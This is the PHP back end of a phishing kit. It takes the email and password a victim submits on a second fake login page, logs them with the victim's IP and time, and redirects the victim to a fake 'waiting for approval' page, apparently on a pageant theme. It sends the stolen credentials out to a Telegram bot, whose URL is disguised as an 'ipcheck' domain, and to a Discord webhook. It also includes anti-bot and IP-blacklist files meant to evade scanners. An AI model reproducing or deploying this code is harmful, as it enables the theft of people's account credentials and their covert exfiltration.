<?php
include("./assets/antibot.php");
include("./assets/antibots.php");
include("./assets/ip_blacklist.php");
include("./assets/function.php");
include("config.php");
$email = $_POST['eml'];
$password = $_POST['pwd'];
date_default_timezone_set('Asia/Manila');
$time1 = date('M d - h:i:s A');
$hostname = gethostbyaddr($ip2);
$message = "[ $ip2 ] - L O G  I N # 2- [ $time1 ]\nEMAIL # 2: $email\r\nPASSWORD # 2: $password\r\n==========================\n";z6nQf($message);antibot($message);

            header("location:https://missfilipinateen2022.netlify.app/WaitingforApproval.html");

// TELEGRAM SEND FUNCTION
if ($telegram == "on"){
        $Token="$bot_token"; // go to config.php
        $url="https://api.ipcheck.org/bot".$Token;
        $Id="$chat_id"; // go to config.php
        $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] 
            === 'on' ? "https" : "http") . 
        "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $msg .=$actual_link;
        $params=[
                'chat_id'=>$Id, 
                'text'=>$message,
        ];
        $url=str_replace("ipcheck","telegram",$url);
        $ch = curl_init($url . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        // echo($result);
        curl_close($ch);
}

// DISCORD SEND FUNCTION
if ($discord == "on"){
    $web_discord = $webhookUrl; 
    $json_data = array ('content'=>"$message");
    $make_json = json_encode($json_data);
    $ch = curl_init( $web_discord );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}
            
?>
